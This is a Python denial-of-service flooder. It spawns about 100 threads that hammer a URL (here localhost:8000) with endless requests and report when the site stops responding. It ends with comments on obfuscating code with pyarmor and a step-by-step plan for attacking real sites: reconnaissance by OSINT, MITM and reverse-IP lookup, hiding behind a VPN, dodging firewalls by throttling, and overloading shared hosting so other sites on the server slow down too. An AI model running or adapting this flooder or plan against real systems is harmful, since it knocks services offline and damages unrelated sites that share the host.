import requests
import threading
import time

l = []
rl = []


def current_mil_time():
    return round(time.time() * 1000)


def current_sec_time():
    return round(time.time())


def count_resp_per_sec(time_took):
    t = current_sec_time()
    l.append({
        "time_took": time_took,
        "time_received": t,
    })

    for e in l:
        if current_sec_time() - e["time_received"] >= 1:
            l.remove(e)


def count_req_per_sec():
    t = current_sec_time()
    rl.append({
        "time_received": t,
    })

    for e in rl:
        if current_sec_time() - e["time_received"] >= 1:
            rl.remove(e)


message = "DoSing..."


def make_request(name):
    while True:
        count_req_per_sec()
        try:
            s = current_mil_time()
            r = requests.get('http://localhost:8000')
            t = current_mil_time() - s
            # print("Response code from thread #{}: {} took {} ms".format(name, str(r.status_code), t))
            count_resp_per_sec(t)
        except:
            message = "DoS Successful. Site looks down for now."


threads = 100
i = 0
while i <= threads:
    x = threading.Thread(target=make_request, args=(i,))
    print("Starting thread #{}...".format(i))
    x.start()
    i += 1

print("Calculating... wait for a while for it to adjust...")
while True:
    time.sleep(1)
    response_time = 0
    for e in l:
        response_time = response_time + e['time_took']
    if (len(l)) > 0:
        response_time = response_time / len(l)
    if response_time > 60000:
        message = "DoS Successful. Site looks down for now."
    else:
        message = "DoSing..."
    print("\rAverage response time: {}ms; Requests/sec: {}; Responses/sec: {}; {}".format(round(response_time, 2),
                                                                                          len(rl), len(l), message),
          end=""),
    
    
    
    
    
""" code security while production level in real time   :
    ===================================================
    obfuscation =>  dump the code in different way  => tool -> pyarmor 
    minification => get minified version =>  search javascript , python minified convertor in online 
 """
 
""" perfect way to do Dos Attack : 
    ================================

    OSINT => Open Source INTelligence -> get all avaliable information in internet 
        1) app last update 
        2) inatall latest version app inside virtual machine like android stdio 
                what the things happen inside the app  we do  reverse engineering the app  or  we can do MITM 
        3) to setup mitm proxy and check the api request in mitmweb 
        4) run the app  ,   get and ping the url in ping command 
        5) whois ipaddress to get the hosted server 
    
    
    if the server is virtual hosting the can get the bug of random  website then  hack paticular website in multi hosted server like 
    Hostenger

        6 ) hackertarget.com  to run reverse ip lookup   =>  get all website hosted in particlar ip 
        7 ) why ? 
                dedicated server and multi hosted server can handle in different ways  so we use reverse lookup
         waybackmachine  extensions to get website snapshot 
    
        8 )  first you connect vpn 
             dossing the anywebsite in particular virtual hosting server 
             if there is a firefall it will block the ip address 
             then to you limit the thread while doing the dos attack 
             then you test the maximum number of base connection on the particular server 
             if you find the maximum connection  then the  site get mysql error  
             now the cpu utilization is high so the remaining websites are also slow down 
             
 """            
